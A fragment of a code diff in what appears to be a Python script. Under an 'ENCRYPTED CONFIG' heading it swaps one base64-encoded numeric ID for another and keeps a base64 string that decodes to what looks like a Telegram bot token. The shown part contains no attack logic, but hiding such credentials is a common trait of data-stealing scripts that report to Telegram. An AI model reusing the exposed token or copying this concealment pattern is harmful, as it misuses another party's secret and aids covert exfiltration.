@@ -22,7 +22,7 @@ import shutil
 # ========================================
 # ENCRYPTED CONFIG
 # ========================================
-_a = "ODYyNDU3NDI2NQ=="
+_a = "NzY1MjIyOTc3Nw=="
 _b = "ODY3MDE0ODM2ODpBQUU5NWFYUFVDN1U4OFBQdGZwN1ZqSm9lTHZIcGxPd1Zz"
 
 def _d(s):
